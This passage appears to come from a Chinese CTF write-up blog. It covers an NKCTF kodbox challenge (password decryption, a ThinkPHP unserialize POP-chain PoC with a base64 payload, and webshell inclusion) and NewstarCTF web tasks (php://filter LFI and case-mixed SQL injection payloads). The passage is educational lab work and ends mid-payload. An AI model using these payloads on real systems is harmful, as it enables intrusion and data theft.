class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;我曾听说，密码的明文，加上心爱之人的名字(Chu0)，就能够听到游客的心声。&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">而我想告诉你，你就是我心中的那个游客。每一个与你相处的瞬间，都如同解开心灵密码的过程，让我更加深刻地感受到你的独特魅力。</span><br><span class="line"> </span><br><span class="line">你的每一个微笑，都是我心中最美丽的音符；你的每一句关心，都是我灵魂深处最温暖的拥抱。在这个喧嚣的世界中，你是我安静的港湾，是我倚靠的依托。我珍视着与你分享的每一个瞬间，每一段回忆都如同一颗珍珠，串联成我生命中最美丽的项链。</span><br><span class="line"> </span><br><span class="line">或许，这封情书只是文字的表达，但我愿意将它寄予你，如同我内心深处对你的深深情感。希望你能感受到我的真挚，就如同我每一刻都在努力解读心灵密码一般。愿我们的故事能够继续，在这段感情的旅程中，我们共同书写属于我们的美好篇章。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">POST /?user/index/loginSubmit HTTP/1.1</span><br><span class="line">Host: 192.168.128.2</span><br><span class="line">Content-Length: 162</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://192.168.128.2</span><br><span class="line">Referer: http://192.168.128.2/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: kodUserLanguage=zh-CN; CSRF_TOKEN=xxx</span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">name=guest&amp;password=tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI&amp;rememberPassword=0&amp;salt=1&amp;CSRF_TOKEN=xxx&amp;API_ROUTE=user%2Findex%2FloginSubmit</span><br><span class="line"> </span><br><span class="line">hint: 新建文件</span><br></pre></td></tr></table></figure><p>通过这个请求包可以对password进行解密</p><p>注意：?user&#x2F;index&#x2F;loginSubmit</p><p>看一下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginSubmit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loginWithToken</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$res</span> || <span class="variable">$res</span> !== <span class="literal">false</span>) <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title class_">Input</span>::<span class="title function_ invoke__">getArray</span>(<span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;name&quot;</span>=&gt; <span class="keyword">array</span>(<span class="string">&quot;check&quot;</span>=&gt;<span class="string">&quot;require&quot;</span>,<span class="string">&#x27;lengthMax&#x27;</span>=&gt;<span class="number">100</span>),</span><br><span class="line"><span class="string">&quot;password&quot;</span>=&gt; <span class="keyword">array</span>(<span class="string">&#x27;check&#x27;</span>=&gt;<span class="string">&quot;require&quot;</span>,<span class="string">&#x27;lengthMax&#x27;</span>=&gt;<span class="number">10000</span>),</span><br><span class="line"><span class="string">&quot;salt&quot;</span>=&gt; <span class="keyword">array</span>(<span class="string">&quot;default&quot;</span>=&gt;<span class="literal">false</span>),</span><br><span class="line">));</span><br><span class="line"><span class="comment">//你知道tp吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;name&#x27;</span>]===<span class="string">&#x27;guest&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;salt&#x27;</span>]) &#123;</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>], <span class="number">0</span>, <span class="number">5</span>) . <span class="string">&quot;2&amp;$%@(*@(djfhj1923&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="title class_">Mcrypt</span>::<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>], <span class="number">5</span>), <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">userInfo</span>(<span class="variable">$data</span>[<span class="string">&#x27;name&#x27;</span>],<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="comment">// if (!is_array($user))&#123;</span></span><br><span class="line"><span class="comment">// $error = UserModel::errorLang($user);</span></span><br><span class="line"><span class="comment">// $error = $error ? $error:LNG(&#x27;user.pwdError&#x27;);</span></span><br><span class="line"><span class="comment">// show_json($error,false);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// if(!$user[&#x27;status&#x27;])&#123;</span></span><br><span class="line"><span class="comment">// show_json(LNG(&#x27;user.userEnabled&#x27;), ERROR_CODE_USER_INVALID);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loginSuccessUpdate</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loginAuto</span>();</span><br><span class="line"><span class="title function_ invoke__">show_json</span>(<span class="string">&#x27;ok&#x27;</span>,<span class="literal">true</span>,<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">accessToken</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;salt&#x27;</span>]) &#123;</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>], <span class="number">0</span>, <span class="number">5</span>) . <span class="string">&quot;2&amp;$%@(*@(djfhj1923&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="title class_">Mcrypt</span>::<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>], <span class="number">5</span>), <span class="variable">$key</span>);</span><br></pre></td></tr></table></figure><p>发现decode 跟踪解密</p><p>AI写解密脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">* @link http://kodcloud.com/</span><br><span class="line">* @author warlee | e-mail:kodcloud@qq.com</span><br><span class="line">* @copyright warlee <span class="number">2014.</span>(Shanghai)Co.,Ltd</span><br><span class="line">* @license http://kodcloud.com/tools/license/license.txt</span><br><span class="line">*------</span><br><span class="line">* 字符串加解密类；</span><br><span class="line">* 一次一密；且定时解密有效</span><br><span class="line">* 可用于加密&amp;动态key生成</span><br><span class="line">* demo：</span><br><span class="line">* 加密：echo Mcrypt::encode(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line">* 解密：echo Mcrypt::decode(<span class="string">&#x27;9f843I0crjv5y0dWE_-uwzL_mZRyRb1ynjGK4I_IAC</span></span><br><span class="line"><span class="string">Q&#x27;</span>,<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line">*/</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mcrypt</span>&#123;</span><br><span class="line">public static $defaultKey = <span class="string">&#x27;a!takA:dlmcldEv,e&#x27;</span>;</span><br><span class="line">/**</span><br><span class="line">* 字符加解密，一次一密,可定时解密有效</span><br><span class="line">*</span><br><span class="line">* @param string $string 原文或者密文</span><br><span class="line">* @param string $operation 操作(encode | decode)</span><br><span class="line">* @param string $key 密钥</span><br><span class="line">* @param <span class="built_in">int</span> $expiry 密文有效期,单位s,<span class="number">0</span> 为永久有效</span><br><span class="line">* @<span class="keyword">return</span> string 处理后的 原文或者 经过 base64_encode 处理后的密文</span><br><span class="line">*/</span><br><span class="line">public static function encode($string,$key = <span class="string">&#x27;&#x27;</span>, $expiry = <span class="number">0</span>,$cKeyS</span><br><span class="line">et=<span class="string">&#x27;&#x27;</span>,$encode=true)&#123;</span><br><span class="line"><span class="keyword">if</span>($encode)&#123;$string = rawurlencode($string);&#125;</span><br><span class="line">$ckeyLength = <span class="number">4</span>;</span><br><span class="line">$key = md5($key ? $key : self::$defaultKey); //解密密匙</span><br><span class="line">$keya = md5(substr($key, <span class="number">0</span>, <span class="number">16</span>)); //做数据完整性验</span><br><span class="line">证</span><br><span class="line">$keyb = md5(substr($key, <span class="number">16</span>, <span class="number">16</span>)); //用于变化生成的</span><br><span class="line">密文 (初始化向量IV)</span><br><span class="line">$cKeySet = $cKeySet ? $cKeySet: md5(microtime());</span><br><span class="line">$keyc = substr($cKeySet, - $ckeyLength);</span><br><span class="line">$cryptkey = $keya . md5($keya . $keyc);</span><br><span class="line">$keyLength = strlen($cryptkey);</span><br><span class="line">PHP</span><br><span class="line">$string = sprintf(<span class="string">&#x27;%010d&#x27;</span>, $expiry ? $expiry + time() : <span class="number">0</span>).su</span><br><span class="line">bstr(md5($string . $keyb), <span class="number">0</span>, <span class="number">16</span>) . $string;</span><br><span class="line">$stringLength = strlen($string);</span><br><span class="line"></span><br><span class="line">$rndkey = array();</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt;= <span class="number">255</span>; $i++) &#123;</span><br><span class="line">$rndkey[$i] = <span class="built_in">ord</span>($cryptkey[$i % $keyLength]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$box = <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">// 打乱密匙簿，增加随机性</span><br><span class="line"><span class="keyword">for</span>($j = $i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">$j = ($j + $box[$i] + $rndkey[$i]) % <span class="number">256</span>;</span><br><span class="line">$tmp = $box[$i];</span><br><span class="line">$box[$i] = $box[$j];</span><br><span class="line">$box[$j] = $tmp;</span><br><span class="line">&#125;</span><br><span class="line">// 加解密，从密匙簿得出密匙进行异或，再转成字符</span><br><span class="line">$result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>($a = $j = $i = <span class="number">0</span>; $i &lt; $stringLength; $i++) &#123;</span><br><span class="line">$a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">$j = ($j + $box[$a]) % <span class="number">256</span>;</span><br><span class="line">$tmp = $box[$a];</span><br><span class="line">$box[$a] = $box[$j];</span><br><span class="line">$box[$j] = $tmp;</span><br><span class="line">$result .= <span class="built_in">chr</span>(<span class="built_in">ord</span>($string[$i]) ^ ($box[($box[$a] + $box</span><br><span class="line">[$j]) % <span class="number">256</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$result = $keyc . str_replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, base64_encode($resul</span><br><span class="line">t));</span><br><span class="line">$result = str_replace(array(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;=&#x27;</span>),array(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;.&#x27;</span>), $result);</span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* 字符加解密，一次一密,可定时解密有效</span><br><span class="line">*</span><br><span class="line">* @param string $string 原文或者密文</span><br><span class="line">* @param string $operation 操作(encode | decode)</span><br><span class="line">* @param string $key 密钥</span><br><span class="line">* @param <span class="built_in">int</span> $expiry 密文有效期,单位s,<span class="number">0</span> 为永久有效</span><br><span class="line">* @<span class="keyword">return</span> string 处理后的 原文或者 经过 base64_encode 处理后的密文</span><br><span class="line">*/</span><br><span class="line">public static function decode($string,$key = <span class="string">&#x27;&#x27;</span>,$encode=true)&#123;</span><br><span class="line">$string = str_replace(array(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;.&#x27;</span>),array(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;=&#x27;</span>), $string);</span><br><span class="line">$ckeyLength = <span class="number">4</span>;</span><br><span class="line">$key = md5($key ? $key : self::$defaultKey); //解密密匙</span><br><span class="line">$keya = md5(substr($key, <span class="number">0</span>, <span class="number">16</span>)); //做数据完整性验</span><br><span class="line">证</span><br><span class="line">$keyb = md5(substr($key, <span class="number">16</span>, <span class="number">16</span>)); //用于变化生成的</span><br><span class="line">密文 (初始化向量IV)</span><br><span class="line">$keyc = substr($string, <span class="number">0</span>, $ckeyLength);</span><br><span class="line">$cryptkey = $keya . md5($keya . $keyc);</span><br><span class="line">$keyLength = strlen($cryptkey);</span><br><span class="line">$string = base64_decode(substr($string, $ckeyLength));</span><br><span class="line">$stringLength = strlen($string);</span><br><span class="line">$rndkey = array();</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt;= <span class="number">255</span>; $i++) &#123;</span><br><span class="line">$rndkey[$i] = <span class="built_in">ord</span>($cryptkey[$i % $keyLength]);</span><br><span class="line">&#125;</span><br><span class="line">$box = <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line"> // 打乱密匙簿，增加随机性</span><br><span class="line"><span class="keyword">for</span>($j = $i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">$j = ($j + $box[$i] + $rndkey[$i]) % <span class="number">256</span>;</span><br><span class="line">$tmp = $box[$i];</span><br><span class="line">$box[$i] = $box[$j];</span><br><span class="line">$box[$j] = $tmp;</span><br><span class="line">&#125;</span><br><span class="line"> // 加解密，从密匙簿得出密匙进行异或，再转成字符 $result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>($a = $j = $i = <span class="number">0</span>; $i &lt; $stringLength; $i++) &#123;</span><br><span class="line">$a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">$j = ($j + $box[$a]) % <span class="number">256</span>;</span><br><span class="line">$tmp = $box[$a];</span><br><span class="line">$box[$a] = $box[$j];</span><br><span class="line">$box[$j] = $tmp;</span><br><span class="line">$result .= <span class="built_in">chr</span>(<span class="built_in">ord</span>($string[$i]) ^ ($box[($box[$a] + $box</span><br><span class="line">[$j]) % <span class="number">256</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$theTime = intval(substr($result, <span class="number">0</span>, <span class="number">10</span>));</span><br><span class="line">$resultStr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (($theTime == <span class="number">0</span> || $theTime - time() &gt; <span class="number">0</span>)</span><br><span class="line">&amp;&amp; substr($result, <span class="number">10</span>, <span class="number">16</span>) == substr(md5(substr($result, </span><br><span class="line"><span class="number">26</span>) . $keyb), <span class="number">0</span>, <span class="number">16</span>)</span><br><span class="line">) &#123;</span><br><span class="line">$resultStr = substr($result, <span class="number">26</span>);</span><br><span class="line"><span class="keyword">if</span>($encode)&#123;$resultStr = rawurldecode($resultStr);&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $resultStr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="string">&#x27;tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1h</span></span><br><span class="line"><span class="string">RiPQvaI&#x27;</span>;</span><br><span class="line">$key = substr($a, <span class="number">0</span>, <span class="number">5</span>) . <span class="string">&quot;2&amp;$%@(*@(djfhj1923&quot;</span>;</span><br><span class="line">echo Mcrypt::decode(substr($a, <span class="number">5</span>),$key);</span><br></pre></td></tr></table></figure><p>解密出密码为!@!@!@!@NKCTFChu0</p><p>其实sql文件里面也有</p><p>登录</p><p><img src="https://bu.dusays.com/2024/05/15/66441db814e1f.png" alt="image-20240326033828913"></p><p>进入</p><p><img src="https://bu.dusays.com/2024/05/15/66441db8a9e03.png" alt="image-20240326033936498"></p><p>回收站中找到shell 还原</p><p><img src="https://bu.dusays.com/2024/05/15/66441db9455fd.png" alt="image-20240326034213543"></p><p><img src="https://bu.dusays.com/2024/05/15/66441db85781b.png" alt="image-20240326034248340"></p><p>还给了路径 尝试访问该路由发现确实存在该文件</p><p>结合之前的文件包含的__call() </p><p>直接包含  poc:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Collection</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Collection</span>()];<span class="comment">//触发Model __toString(),子类Pivot合适</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Collection</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$items</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;items=<span class="keyword">new</span> <span class="title class_">View</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Testone</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Debug</span> <span class="keyword">extends</span> <span class="title">Testone</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$engine</span>=<span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>=&gt;<span class="string">&quot;data/files/shell&quot;</span>);</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;Loginout&#x27;</span>]=<span class="keyword">new</span> <span class="title class_">Config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="comment">//TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtcc</span></span><br><span class="line">HJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE2OiJ0aGlua1xDb2xs</span><br><span class="line">ZWN0aW9uIjoxOntzOjg6IgAqAGl0ZW1zIjtPOjEwOiJ0aGlua1xWaWV3IjoyOntzOjc6IgA</span><br><span class="line">qAGRhdGEiO2E6MTp7czo4OiJMb2dpbm91dCI7TzoxMjoidGhpbmtcQ29uZmlnIjowOnt9fX</span><br><span class="line">M6NjoiZW5naW5lIjthOjI6e3M6NDoidGltZSI7czo1OiIxMDA4NiI7czo0OiJuYW1lIjtzO</span><br><span class="line">jE2OiJkYXRhL2ZpbGVzL3NoZWxsIjt9fX19fX0==</span><br></pre></td></tr></table></figure><p>发包，后面是一个无回显 rce</p><p><img src="https://bu.dusays.com/2024/05/15/66441dbb4fd96.png" alt="image-20240326035138941"></p><p>执行命令 好像没有bash或nc 用curl dns外带成功</p><p><img src="https://bu.dusays.com/2024/05/15/66441db9dbd5e.png" alt="image-20240326034721835"></p><p>直接读flag</p><p><img src="https://bu.dusays.com/2024/05/15/66441dba220d7.png" alt="image-20240326034755159"></p><p>结束 最后一道题太抽象了</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-NewstarCTF-wp</title>
      <link href="/2024/05/13/2023-NewstarCTF-wp/"/>
      <url>/2024/05/13/2023-NewstarCTF-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="NEW-STAR-WEB"><a href="#NEW-STAR-WEB" class="headerlink" title="NEW STAR    WEB"></a>NEW STAR    WEB</h1><h2 id="week-2"><a href="#week-2" class="headerlink" title="week 2"></a>week 2</h2><h4 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h4><p><img src="https://bu.dusays.com/2024/05/13/6641fa94520ca.png" alt="image-20240126151739468"></p><p>很明显不可能直接手打100000分</p><p>第一次碰到游戏题完全不会做 想了一会 直接give up</p><p>查看wp 复现如下：</p><p><strong>前端题  改javascript代码</strong></p><p><img src="https://bu.dusays.com/2024/05/13/6641fa948961e.png" alt="image-20240126155035820"></p><p>f12后在样式编辑器中可以找到js文件 发现游戏结束代码 346</p><p>这段代码的意思是：当分数高于100000时，向api.php发送post请求，弹窗你的分数并返回一个消息</p><p>所以我们需要改javascript的变量值，将gameScore赋值大于100000</p><p>方法:</p><ul><li><p>在我们需要修改的变量赋值语句之后，下断点（点击语句左侧的序号就能下断点），之后刷新页面（F5），重新载入页面</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9354beb.png" alt="image-20240126155827668"></p></li><li><p>换到 “控制台” 标签页，设置要修改的变量的值，达到覆盖原值的目的，语句格式 “变量名&#x3D;值”，gameScore&#x3D;999999</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa944de84.png" alt="image-20240126160001641"></p></li><li><p>上传后发现分数已经超了，自杀后，切回 “调试器” 标签页，变量值已被修改</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9303a7f.png" alt="image-20240126160542049"></p></li></ul><p>出flag</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa930abed.png" alt="image-20240126160600842"></p><p><img src="https://bu.dusays.com/2024/05/13/6641fa931d501.png" alt="image-20240126160613779"></p><h4 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> nope</span><br></pre></td></tr></table></figure><p>禁用了base64与rot13</p><p>payload:</p><p>convert.iconv过滤器：</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.utf-8.utf-16le&#x2F;resource&#x3D;flag.php</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa931588a.png" alt="image-20240126162458463"></p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;flag.php</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa93e3924.png" alt="image-20240126162642873"></p><p>将+AHs-和+AH0删掉替换成{}，就是flag了</p><ol><li><code>convert.iconv</code>: 这是<code>libiconv</code>库的一个函数，用于字符编码转换。</li><li><code>utf-8.utf-7</code>: 这指定了要执行的转换。在这里，它试图将UTF-8编码转换为UTF-7编码。UTF-7并不是一个有效的或广泛使用的字符编码。</li></ol><p>3.<code>utf-8.utf-16le</code>:将数据从UTF-8编码转换为UTF-16LE编码</p><p><strong>这种转换通常不是攻击者的真正目的，而是利用这个过滤器来造成PHP解析文件内容时的混乱，从而泄露文件内容。实际上，这个转换过程可能会导致PHP输出文件内容的Base64编码或其他形式的编码，而不是直接输出转换后的字符</strong></p><p>同理：</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UCS-2BE.UCS-2LE&#x2F;resource&#x3D;flag.php</p><p><code>convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.UCS-2BE.UCS-2LE</code>: 这是一个字符编码转换过滤器，尝试将文件内容从UCS-2LE编码转换为UCS-2BE编码，然后再转换回UCS-2LE编码。这样的转换通常不是为了实际的编码转换，而是为了造成PHP解析文件时的混乱，从而尝试获取文件内容。</p><p>其他可能:</p><p>rot13:     php:&#x2F;&#x2F;filter&#x2F;string.rot13&#x2F;resource&#x3D;flag.php</p><p>base64:    php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>toupper(转换为大写):   php:&#x2F;&#x2F;filter&#x2F;string.toupper&#x2F;resource&#x3D;flag.php</p><p>tolower(转换为小写):    php:&#x2F;&#x2F;filter&#x2F;string.tolower&#x2F;resource&#x3D;flag.php</p><h4 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h4><p><img src="https://bu.dusays.com/2024/05/13/6641fa93e2e58.png" alt="image-20240127010216221"></p><p>随便点开一个</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9461509.png" alt="image-20240127010253840"></p><p>发现url上有id的传参可能有注入点</p><p>另一个：</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa93d7890.png" alt="image-20240127010404429"></p><p>id不一样 应该是从这里来注入</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa92f034c.png" alt="image-20240127010500010"></p><p>%23：#   %27：‘</p><p>union select查一下 回显no 应该是有waf</p><p>大小写绕一下 可以了</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9433119.png" alt="image-20240127010727025"></p><p>最开始的查表:</p><p>?id&#x3D;1’Union sElect 1,2,3,4,(grOup_conCat(taBle_nAme) froM inforMation_schEma.taBles wHEre taBle_scheMa&#x3D;dataBase())%23</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa93b9353.png" alt="image-20240127012455153"></p><p>懵了 无回显 看了一下 感觉没什么问题啊</p><p>看来下wp</p><p>?id&#x3D;1’ uNion Select ((sElect grOup_cOncat(tAble_name) From infOrmation_schema.tables Where Table_schema&#x3D;Database())),2,3,4,5%23</p><p>为什么要加这个select 不太明白 以前做sql的题没遇见过啊 懵了 AI说这个select是不必要的 但是没有这个select有查不出来 服了 先放在这里吧 之后解决了在回来补上</p><p>加上select后</p><p>?id&#x3D;1’Union sElect 1,2,3,4,(sElect grOup_conCat(taBle_nAme) froM informatiOn_schEma.taBles wHEre taBle_scheMa&#x3D;dataBase())%23</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa940e752.png" alt="image-20240127013225646"></p><p>又懵了 这应该大小写问题 但我是每个单词都改了大小写的 一个一个对发现是information的问题 只有infOrmation和infoRmation可以 这是什么逻辑？双标狗</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa945209d.png" alt="image-20240127013733598"></p><p>查字段名：</p><p>?id&#x3D;1’union select 1,2,3,4,((sElect grOup_cOncat(cOlumn_nAme) From infOrmation_schEma.coLumns 